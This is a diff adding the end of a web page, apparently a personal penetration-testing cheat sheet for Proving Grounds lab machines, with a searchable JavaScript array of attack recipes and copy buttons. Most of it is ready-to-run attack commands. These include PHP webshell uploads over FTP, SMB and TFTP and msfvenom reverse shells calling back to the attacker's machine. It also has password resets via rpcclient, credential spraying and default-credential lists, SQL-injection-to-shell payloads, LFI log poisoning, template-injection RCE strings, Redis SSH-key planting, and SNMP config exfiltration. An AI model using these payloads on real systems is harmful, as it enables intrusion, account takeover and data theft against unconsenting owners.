+cat > shell.php <<'EOF'
+<?php system($_GET['c']); ?>
+EOF
+
+# Upload
+ftp> put shell.php
+ftp> bye
+
+# Trigger via HTTP (find the URL via dirbusting)
+curl 'http://<IP>/shell.php?c=id'
+
+# Or msfvenom for proper reverse
+msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw > shell.php
+# Upload, then:
+nc -lvnp 4444
+curl 'http://<IP>/shell.php'`,
+    cleanup: 'ftp> delete shell.php · rm shell.php local',
+    related: ['ftp-enum', 'upload-bypass']
+  },
+  {
+    id: 'smb-anon-write',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'SMB anon write → webshell on overlapping share',
+    triggers: ['smb write', 'smb upload webshell', 'writable smb', 'share to webroot'],
+    action: 'Some SMB shares double as webroot mounts. Write a webshell via SMB, find it via HTTP. Same primitive as anon FTP but Windows-flavored.',
+    cmd: `# Test write
+smbclient //<IP>/<share> -N
+smb: > put /etc/passwd test.txt
+# Success = writable
+
+# Drop ASPX shell (Windows webroot)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f aspx > shell.aspx
+smbclient //<IP>/<share> -N
+smb: > put shell.aspx
+
+# Trigger
+curl http://<IP>/shell.aspx
+
+# Or PHP if Linux server
+msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw > shell.php`,
+    cleanup: 'smb: > rm shell.aspx',
+    related: ['smb-anon-read', 'upload-bypass']
+  },
+  {
+    id: 'tftp',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'TFTP/69 — put without auth',
+    triggers: ['tftp', '69', 'tftp put', 'tftp get'],
+    action: 'TFTP has no auth concept. If open, you can usually put files. Less common on PG but appears.',
+    cmd: `# Confirm open
+sudo nmap -sU -p69 <IP>
+
+# Connect
+tftp <IP>
+tftp> binary
+tftp> put shell.php
+tftp> get sensitive.conf
+
+# Or one-shot
+echo "<?php system(\\$_GET['c']); ?>" > shell.php
+curl -T shell.php tftp://<IP>/`,
+    cleanup: 'tftp> delete shell.php (if supported)',
+    related: ['ftp-anon-write']
+  },
+
+  // ============= FOOTHOLD: CRED FOUND =============
+  {
+    id: 'rpcclient-reset',
+    phase: 'access', state: 'admin', tags: ['pg15'],
+    title: '⭐ rpcclient password reset [PG #15 Nagoya]',
+    triggers: ['rpcclient', 'setuserinfo2', 'password reset', 'nagoya', 'helpdesk account', 'reset user'],
+    action: 'Your PG Nagoya technique. svc_helpdesk had User-Force-Change-Password rights → rpcclient setuserinfo2 reset target user pwd → login. The key flag: `23` = info level for setting password.',
+    cmd: `# Need: account with reset rights on target user
+# (typical: helpdesk service account, identified via BloodHound)
+
+# Login as the privileged account
+rpcclient -U <domain>/svc_helpdesk <DC-IP>
+Password for [<domain>\\svc_helpdesk]: <pwd>
+
+# Reset target user's password
+rpcclient $> setuserinfo2 <target-user> 23 NewPwd123!
+# 23 = level for password change
+
+# Now login as the target
+evil-winrm -i <DC-IP> -u <target-user> -p 'NewPwd123!'
+
+# Alternative tools for same primitive:
+net rpc password '<target>' 'NewPwd!' -U '<dom>\\svc_helpdesk%<pwd>' -S <DC>
+impacket-changepasswd '<dom>/<svc>:<pwd>'@<DC> -altuser '<target>' -newpass 'NewPwd!'
+
+# Reference: PG #15 Nagoya (your walkthrough)`,
+    cleanup: '# Reset target back to original pwd if known. Otherwise note in report as state change.',
+    related: ['rpc-enum', 'cred-spray', 'winrm-creds']
+  },
+  {
+    id: 'cred-spray',
+    phase: 'access', state: 'user', tags: [],
+    title: 'Cred reuse — spray every cred against every user',
+    triggers: ['cred reuse', 'password reuse', 'spray', 'cme spray', 'reuse pattern', 'horizontal'],
+    action: 'Every cred you find gets sprayed: across all users on the host, and across all hosts in scope. PG #15 svc_mssql worked elsewhere too — almost always does.',
+    cmd: `# One pwd against all users
+crackmapexec smb <IP> -u users.txt -p '<found-pwd>' --continue-on-success
+crackmapexec winrm <IP> -u users.txt -p '<found-pwd>' --continue-on-success
+
+# Found a hash → PtH spray
+crackmapexec smb <IP-range> -u users.txt -H <NT> --continue-on-success
+
+# Multiple hosts at once
+crackmapexec smb 10.10.10.0/24 -u <user> -p '<pwd>'
+
+# Show only hits
+nxc smb <range> -u users.txt -p '<pwd>' | grep '\\[+\\]'
+
+# SSH spray
+hydra -L users.txt -p '<pwd>' ssh://<IP> -t 4`,
+    cleanup: '',
+    related: ['rpcclient-reset', 'winrm-creds', 'ssh-login']
+  },
+  {
+    id: 'winrm-creds',
+    phase: 'access', state: 'user', tags: [],
+    title: 'evil-winrm with creds → full PS shell',
+    triggers: ['evil-winrm', 'winrm login', 'powershell remote', '5985 shell'],
+    action: 'Once 5985 + creds confirmed, evil-winrm gives a full PowerShell session with upload/download built in. Cleanest Windows shell.',
+    cmd: `# Password
+evil-winrm -i <IP> -u <user> -p '<pwd>'
+
+# PtH
+evil-winrm -i <IP> -u <user> -H <NT>
+
+# Inside evil-winrm:
+*Evil-WinRM* PS> whoami /priv
+*Evil-WinRM* PS> upload /home/kali/winpeas.exe C:\\Temp\\winpeas.exe
+*Evil-WinRM* PS> download C:\\Users\\<user>\\Desktop\\proof.txt
+*Evil-WinRM* PS> menu     # show built-in helpers
+*Evil-WinRM* PS> Invoke-Binary /opt/PrintSpoofer/PrintSpoofer.exe
+
+# If 5985 blocked but 5986 open (HTTPS)
+evil-winrm -i <IP> -u <user> -p '<pwd>' -S`,
+    cleanup: '',
+    related: ['winrm-enum', 'cred-spray']
+  },
+  {
+    id: 'ssh-login',
+    phase: 'access', state: 'user', tags: [],
+    title: 'SSH with creds/key',
+    triggers: ['ssh login', 'ssh key', 'ssh -i', 'id_rsa', 'private key login'],
+    action: 'Standard but listed for completeness. Force key-only when you have id_rsa with banner that doesn\'t accept passwords for your user.',
+    cmd: `# With password
+ssh <user>@<IP>
+
+# With key
+chmod 600 id_rsa
+ssh -i id_rsa <user>@<IP>
+
+# Force key even when server prefers pwd
+ssh -i id_rsa -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes <user>@<IP>
+
+# Stuck on old kex algorithms (legacy servers)
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \\
+    -oHostKeyAlgorithms=+ssh-rsa <user>@<IP>
+
+# Once in, full TTY
+python3 -c "__import__('pty').spawn('/bin/bash')"
+# or: script -qc /bin/bash /dev/null`,
+    cleanup: '',
+    related: ['rsync-keys', 'nfs-mount']
+  },
+  {
+    id: 'rdp-login',
+    phase: 'access', state: 'user', tags: [],
+    title: 'xfreerdp with creds + drive share',
+    triggers: ['xfreerdp', 'rdp login', 'rdp creds', 'rdp drive', '/drive'],
+    action: 'xfreerdp /drive option mounts a Kali folder inside RDP — easy file transfer.',
+    cmd: `# Basic login
+xfreerdp /v:<IP> /u:<user> /p:'<pwd>' /size:1280x800 /cert:ignore
+
+# With shared folder (transfer files)
+xfreerdp /v:<IP> /u:<user> /p:'<pwd>' \\
+  /size:1280x800 /cert:ignore /dynamic-resolution \\
+  /drive:share,/tmp/share
+
+# With domain
+xfreerdp /v:<IP> /u:'CORP\\<user>' /p:'<pwd>' /cert:ignore
+
+# RestrictedAdmin mode (PtH-ish)
+xfreerdp /v:<IP> /u:<user> /pth:<NT> /cert:ignore`,
+    cleanup: '',
+    related: ['rdp-enum', 'winrm-creds']
+  },
+  {
+    id: 'default-creds',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'Default credentials — the 30-second win',
+    triggers: ['default creds', 'tomcat tomcat', 'admin admin', 'root root', 'default password'],
+    action: 'Before any other attack on an authenticated service, try the obvious. PG examples: tomcat:tomcat, jenkins admin:admin, grafana admin:admin, OpenEMR openemr/openemr.',
+    cmd: `# Cheat-sheet of frequent PG defaults:
+# Tomcat:        tomcat:tomcat · admin:admin · admin:tomcat · admin:password
+# Jenkins:       admin:admin · admin:jenkins · jenkins:jenkins
+# Grafana:       admin:admin
+# OpenEMR:       admin:pass · openemr:openemr
+# Confluence:    admin:admin
+# Nexus:         admin:admin123
+# Gogs/Gitea:    admin:admin · gitea:gitea
+# H2 DB:         sa:(blank)
+# MSSQL:         sa:(blank) · sa:sa · sa:password
+# MySQL/MariaDB: root:(blank) · root:root
+# PostgreSQL:    postgres:postgres
+# Redis:         (no auth) · foobared
+# MongoDB:       (no auth)
+# phpMyAdmin:    root:(blank) · admin:admin
+# WordPress:     admin:admin · admin:password
+# Drupal:        admin:admin
+# Joomla:        admin:admin
+# CUPS:          admin:admin
+# Web app generally: <app-name>:<app-name>
+
+# Bulk test against HTTP login
+hydra -L users.txt -P pwds.txt -f http-post-form \\
+  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`,
+    cleanup: '',
+    related: ['tomcat', 'jenkins', 'wordpress']
+  },
+
+  // ============= WEB→RCE (ABUSE) =============
+  {
+    id: 'upload-bypass',
+    phase: 'abuse', state: 'admin', tags: ['pg35'],
+    title: 'File upload bypass [PG #35 Access via .htaccess]',
+    triggers: ['upload bypass', 'php upload', '.htaccess', 'double extension', 'magic bytes', 'access box'],
+    action: 'Filters drop .php. Bypasses: alt extensions (.phtml/.phar/.php5), .htaccess to redefine handlers, GIF89a magic bytes, Content-Type swap, double extension. (PG #35 Access used .htaccess.)',
+    cmd: `# Generic PHP shell
+cat > shell.php <<'EOF'
+<?php system($_GET['c']); ?>
+EOF
+
+# BYPASS 1: alt extension (server still parses)
+cp shell.php shell.phtml
+cp shell.php shell.phar
+cp shell.php shell.php5
+cp shell.php shell.pht
+
+# BYPASS 2: .htaccess redefines handler (PG Access)
+# Upload TWO files:
+# 1) .htaccess with:
+echo 'AddType application/x-httpd-php .jpg' > .htaccess
+# 2) shell.jpg containing PHP code
+cp shell.php shell.jpg
+
+# BYPASS 3: magic bytes prefix
+printf 'GIF89a;\\n<?php system($_GET[\\"c\\"]); ?>' > shell.gif.php
+
+# BYPASS 4: Content-Type swap in Burp
+# Change Content-Type: application/x-php → image/jpeg
+# Keep filename as shell.php
+
+# BYPASS 5: double extension
+mv shell.php shell.php.jpg
+
+# Locate uploaded path via dirbusting → trigger
+curl 'http://<IP>/uploads/shell.phtml?c=id'`,
+    cleanup: '# remove uploaded shell via web app or direct',
+    related: ['webdav', 'wordpress']
+  },
+  {
+    id: 'sqli-mssql',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'SQLi → xp_cmdshell (MSSQL)',
+    triggers: ['sqli mssql', 'xp_cmdshell stack', 'sqlmap os-shell', 'mssql injection', 'stacked queries'],
+    action: 'Stack queries supported → xp_cmdshell direct. sqlmap --os-shell automates the full chain. PG #22 Butch pattern.',
+    cmd: `# Detect with sqlmap
+sqlmap -u 'http://<IP>/?id=1' --dbms=mssql --batch
+
+# Direct OS shell (automates enable + exec)
+sqlmap -u 'http://<IP>/?id=1' --dbms=mssql --os-shell
+
+# Manual stacked query injection (when sqlmap misses)
+# Original:  ?id=1
+# Injection: ?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'--
+
+# Common URL-encode tricky chars:
+%20 → space
+%27 → '
+%3B → ;
+
+# Reverse shell payload (encode PowerShell base64)
+EXEC xp_cmdshell 'powershell -e <base64>'`,
+    cleanup: `EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;`,
+    related: ['mssql-enum', 'sqli-mysql']
+  },
+  {
+    id: 'sqli-mysql',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'SQLi → INTO OUTFILE (MySQL)',
+    triggers: ['sqli mysql', 'into outfile', 'load_file', 'mysql injection', 'webshell drop sql'],
+    action: 'MySQL with FILE privilege can write to disk. UNION → INTO OUTFILE writes a webshell if webroot is known + writable. PG #6 Pebbles pattern.',
+    cmd: `# Detect/sweep
+sqlmap -u 'http://<IP>/?id=1' --dbms=mysql --batch
+
+# Check FILE privilege
+sqlmap -u 'http://<IP>/?id=1' --privileges --batch
+
+# File write via sqlmap
+sqlmap -u 'http://<IP>/?id=1' --file-write=shell.php --file-dest=/var/www/html/shell.php
+
+# Manual UNION + INTO OUTFILE
+# Original:  ?id=1
+# Injection: ?id=-1 UNION SELECT '<?php system($_GET["c"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+
+# Common webroot guesses:
+# /var/www/html/  ·  /var/www/  ·  /usr/share/nginx/html/  ·  C:\\\\xampp\\\\htdocs\\\\
+
+# Read file with load_file
+# Injection: ?id=-1 UNION SELECT load_file('/etc/passwd'),2,3--`,
+    cleanup: '# delete uploaded shell.php via shell once in',
+    related: ['mysql-enum', 'sqli-mssql']
+  },
+  {
+    id: 'lfi-poison',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'LFI → log poisoning (SSH / Apache)',
+    triggers: ['lfi', 'log poisoning', 'auth.log', 'access.log', 'php://input', 'proc/self/environ'],
+    action: 'LFI confirmed → poison a log file you can read via the LFI. Apache access.log: inject PHP via User-Agent or URL path. SSH auth.log: inject via failed-login username.',
+    cmd: `# Confirm LFI
+curl 'http://<IP>/?file=../../../../etc/passwd'
+
+# Read PHP source (look for creds first)
+curl 'http://<IP>/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d
+
+# Apache access.log poisoning
+curl -H 'User-Agent: <?php system($_GET["c"]); ?>' http://<IP>/
+# Then trigger via LFI:
+curl 'http://<IP>/?file=/var/log/apache2/access.log&c=id'
+
+# SSH auth.log poisoning (when LFI can read auth.log)
+ssh '<?php system($_GET["c"]); ?>'@<IP>
+# (login fails but the username is logged)
+curl 'http://<IP>/?file=/var/log/auth.log&c=id'
+
+# /proc/self/environ poisoning
+curl -H 'User-Agent: <?php system($_GET["c"]); ?>' \\
+  'http://<IP>/?file=/proc/self/environ&c=id'
+
+# php://input wrapper (when POST allowed)
+curl -d '<?php system($_GET["c"]); ?>' \\
+  'http://<IP>/?file=php://input&c=id'`,
+    cleanup: '# log entries persist — note in report',
+    related: ['upload-bypass', 'source-grep']
+  },
+  {
+    id: 'ssti',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'SSTI — Jinja2 / Twig / Smarty detection',
+    triggers: ['ssti', 'template injection', 'jinja2', 'twig', 'smarty', '{{7*7}}'],
+    action: 'Detect with {{7*7}} or ${7*7}. Confirmed engine → exploit-specific payload to RCE.',
+    cmd: `# Detection (try in every text input)
+{{7*7}}                   # → 49 if Jinja2/Twig
+${7*7}                    # → 49 if FreeMarker/Velocity
+*{7*7}                    # → 49 if Mako/Tornado
+#{7*7}                    # → 49 if Ruby
+
+# Jinja2 RCE (Flask-Jinja2)
+{{ ''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate() }}
+
+# Better Jinja2 RCE
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+# Twig RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Smarty
+{php}system("id");{/php}
+
+# Use tplmap for automation
+git clone https://github.com/epinna/tplmap
+./tplmap.py -u 'http://<IP>/?name=*'`,
+    cleanup: '',
+    related: ['upload-bypass']
+  },
+  {
+    id: 'redis-keys',
+    phase: 'abuse', state: 'admin', tags: ['pg25'],
+    title: 'Redis unauth → SSH keys [PG #25 Readys]',
+    triggers: ['redis ssh keys', 'redis foothold', 'config set dir', 'dbfilename ssh', 'readys'],
+    action: 'PG Readys technique. Unauth Redis → CONFIG SET dir to .ssh, dbfilename authorized_keys, write your pubkey via SET → SAVE.',
+    cmd: `# Generate your keypair first
+ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ''
+
+# Format pubkey with newlines for redis storage
+(echo; cat id_rsa.pub; echo) > pubkey.txt
+
+# Pipe into redis with CR/LF wrapping
+cat pubkey.txt | redis-cli -h <IP> -x set mykey
+
+# Then configure redis to dump to .ssh/authorized_keys
+redis-cli -h <IP> CONFIG SET dir /var/lib/redis/.ssh/
+redis-cli -h <IP> CONFIG SET dbfilename authorized_keys
+redis-cli -h <IP> SAVE
+
+# Try common redis home dirs if first fails:
+# /var/lib/redis/  ·  /home/redis/  ·  /root/
+
+# SSH in as the redis user
+ssh -i id_rsa redis@<IP>
+# or root@<IP> if dumped to /root/.ssh/
+
+# Webshell variant (when webroot writable)
+redis-cli -h <IP> CONFIG SET dir /var/www/html/
+redis-cli -h <IP> CONFIG SET dbfilename shell.php
+redis-cli -h <IP> SET payload '<?php system($_GET["c"]); ?>'
+redis-cli -h <IP> SAVE
+curl 'http://<IP>/shell.php?c=id'`,
+    cleanup: '# revert CONFIG SET dir/dbfilename to defaults · remove planted authorized_keys',
+    related: ['redis-enum', 'ssh-login']
+  },
+  {
+    id: 'snmp-rw',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'SNMP write community → config push',
+    triggers: ['snmp write', 'snmp rw', 'snmpset', 'community private', 'snmp rce'],
+    action: 'Public is read-only but private/manager/secret can be write-capable. SNMP set on router/device → arbitrary config push.',
+    cmd: `# Test write
+snmpset -v 2c -c private <IP> 1.3.6.1.2.1.1.5.0 s "test"
+# No error = write community accepted
+
+# Common write strings to try:
+# private · manager · secret · cisco · admin · write
+
+# Cisco-specific config exfil/replace
+# Pull running config
+snmpset -v 2c -c private <IP> 1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 \\
+  1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 \\
+  1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 \\
+  1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a "<KALI>" \\
+  1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s "config.cfg" \\
+  1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1
+
+# Host config on Kali via TFTP
+sudo apt install atftpd
+echo "" > /var/lib/tftpboot/config.cfg`,
+    cleanup: '',
+    related: ['snmp-enum']
+  },
+  {
+    id: 'public-exploit',
+    phase: 'abuse', state: 'admin', tags: [],
+    title: 'Public CVE PoC — find + edit + run',
+    triggers: ['cve', 'public exploit', 'github poc', 'exploit-db', 'edit poc'],
+    action: 'Banner → CVE → GitHub PoC → edit ports/IPs → run. 80% of PG boxes have a known CVE path. Always edit before running.',
+    cmd: `# Find
+searchsploit <product> <version>
+# Also: github search · google "<product> <version> CVE exploit"
+
+# Download
+searchsploit -m <ID>
+# or: git clone <github-url>
+
+# READ THE EXPLOIT FIRST (always)
+cat exploit.py | head -50
+# Look for: hardcoded LHOST/LPORT/RHOST/PORTs to change
+# Look for: required dependencies (pip)
+# Look for: any "edit me" comments
+
+# Python deps
+pip install -r requirements.txt 2>/dev/null
+# or: pip install <missing-module>
+
+# Typical edits before run
+sed -i 's/192.168.1.10/<KALI>/' exploit.py
+sed -i 's/4444/<KALI-PORT>/' exploit.py
+
+# Run + catch
+nc -lvnp 4444 &
+python3 exploit.py <IP>:<PORT>
+
+# Known-CVE PG boxes for reference:
+# #4 GLPI (htmlawed RCE) · #56 Law (CVE-2022-35914)
+# #62 Flu (Confluence 7.13.6) · #36 Apex (OpenEMR 5.0.1.1)
+# #16 Hub (FuguHub 8.1 Lua) · #25 Readys (Redis)`,
+    cleanup: '',
+    related: ['searchsploit']
+  },
+];
+
+const phaseOrder = ['setup', 'access', 'enum', 'abuse', 'win'];
+const phaseLabels = { setup: 'TRIAGE', access: 'FOOTHOLD', enum: 'SVC-ENUM', abuse: 'WEB→RCE', win: 'WIN' };
+
+const $ = (sel) => document.querySelector(sel);
+const searchEl = $('#search'); const resultsEl = $('#results');
+const filterBtns = document.querySelectorAll('.pill');
+let activeFilter = 'all'; let query = '';
+
+function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+function highlight(text, q) {
+  if (!q) return escapeHtml(text);
+  const escaped = escapeHtml(text);
+  const terms = q.split(/\s+/).filter(t => t.length > 0).map(t => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+  if (!terms.length) return escaped;
+  const re = new RegExp(`(${terms.join('|')})`, 'gi');
+  return escaped.replace(re, '<mark>$1</mark>');
+}
+function matchesQuery(p, q) {
+  if (!q) return true;
+  const hay = [p.title, p.action, p.cmd, p.triggers.join(' '), (p.tags||[]).join(' '), p.id].join(' ').toLowerCase();
+  const terms = q.toLowerCase().split(/\s+/).filter(t => t.length > 0);
+  return terms.every(t => hay.includes(t));
+}
+function matchesFilter(p, f) {
+  if (f === 'all') return true;
+  if (f === 'state-user') return p.state === 'user' || p.state === 'both';
+  if (f === 'state-admin') return p.state === 'admin' || p.state === 'both';
+  return p.phase === f;
+}
+function renderCard(p, q) {
+  const tH = p.triggers.map(t => {
+    const m = q && q.toLowerCase().split(/\s+/).some(qt => qt.length > 0 && t.toLowerCase().includes(qt));
+    return `<span class="trigger ${m ? 'match' : ''}">${escapeHtml(t)}</span>`;
+  }).join('');
+  const cH = p.cmd ? `<div class="cmd-wrap"><pre class="cmd">${highlight(p.cmd, q)}</pre><button class="cmd-copy" data-cmd="${encodeURIComponent(p.cmd)}">COPY</button></div>` : '';
+  const clH = p.cleanup ? `<div class="cleanup"><span class="cleanup-label">CLEANUP</span>${escapeHtml(p.cleanup)}</div>` : '';
+  const sL = { user: '<span class="state-tag user">NEEDS CRED</span>', admin: '<span class="state-tag admin">UNAUTH</span>', both: '<span class="state-tag both">EITHER</span>' }[p.state] || '';
+  const pgTag = (p.tags || []).find(t => t.startsWith('pg')) ? `<span class="pg-tag">PG #${(p.tags.find(t => t.startsWith('pg'))).slice(2)}</span>` : '';
+  return `<article class="card" data-phase="${p.phase}" data-state="${p.state}" id="card-${p.id}">
+    <div class="card-head"><div class="card-title">${highlight(p.title, q)}</div><span class="card-cat">${phaseLabels[p.phase]}</span></div>
+    <div class="triggers">${tH}</div>
+    <div class="arrow-line"><span class="arrow">→</span><span class="action">${highlight(p.action, q)}</span></div>
+    ${cH}${clH}<div class="card-foot">${sL}${pgTag}</div></article>`;
+}
+function render() {
+  const f = patterns.filter(p => matchesFilter(p, activeFilter) && matchesQuery(p, query));
+  $('#resultCount').textContent = f.length;
+  if (f.length === 0) { resultsEl.innerHTML = `<div class="empty"><div class="empty-icon">⌬</div><div class="empty-title">no patterns match</div><div class="empty-hint">try: 'rsync', 'rpcclient', 'ftp', 'tomcat', 'sqli', 'lfi'</div></div>`; return; }
+  let html = '';
+  if (activeFilter === 'all' && !query) {
+    phaseOrder.forEach(ph => {
+      const inPh = f.filter(p => p.phase === ph);
+      if (!inPh.length) return;
+      html += `<div style="margin: 18px 0 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.2em;">▸ ${phaseLabels[ph]} <span style="opacity:0.5">[${inPh.length}]</span></div>`;
+      html += `<div class="grid">${inPh.map(p => renderCard(p, query)).join('')}</div>`;
+    });
+  } else { html = `<div class="grid">${f.map(p => renderCard(p, query)).join('')}</div>`; }
+  resultsEl.innerHTML = html;
+  resultsEl.querySelectorAll('.cmd-copy').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      try { await navigator.clipboard.writeText(decodeURIComponent(btn.dataset.cmd)); btn.textContent = 'COPIED'; btn.classList.add('copied'); setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500); } catch (err) { btn.textContent = 'ERR'; }
+    });
+  });
+}
+function updateCounts() {
+  $('#totalCount').textContent = patterns.length;
+  $('#count-all').textContent = patterns.length;
+  phaseOrder.forEach(ph => { const c = patterns.filter(p => p.phase === ph).length; const el = document.getElementById(`count-${ph}`); if (el) el.textContent = c; });
+  const uE = document.getElementById('count-state-user'); const aE = document.getElementById('count-state-admin');
+  if (uE) uE.textContent = patterns.filter(p => p.state === 'user' || p.state === 'both').length;
+  if (aE) aE.textContent = patterns.filter(p => p.state === 'admin' || p.state === 'both').length;
+}
+searchEl.addEventListener('input', (e) => { query = e.target.value.trim(); render(); });
+filterBtns.forEach(btn => { btn.addEventListener('click', () => { activeFilter = btn.dataset.filter; filterBtns.forEach(b => b.classList.toggle('active', b === btn)); render(); document.getElementById('cards').scrollIntoView({behavior: 'smooth', block: 'start'}); }); });
+document.addEventListener('keydown', (e) => {
+  if ((e.metaKey || e.ctrlKey) && e.key === 'k') { e.preventDefault(); searchEl.focus(); searchEl.select(); }
+  if (e.key === 'Escape' && document.activeElement === searchEl) { searchEl.value = ''; query = ''; render(); searchEl.blur(); }
+});
+document.querySelectorAll('.diagram svg a').forEach(a => {
+  a.addEventListener('click', (e) => {
+    const href = a.getAttribute('href');
+    if (!href || !href.startsWith('#card-')) return;
+    setTimeout(() => { const t = document.querySelector(href); if (t) { t.classList.remove('flash'); void t.offsetWidth; t.classList.add('flash'); } }, 100);
+  });
+});
+document.querySelectorAll('.checklist li').forEach(li => { li.addEventListener('click', () => li.classList.toggle('done')); });
+updateCounts(); render();
+</script>
+</body>
+</html>
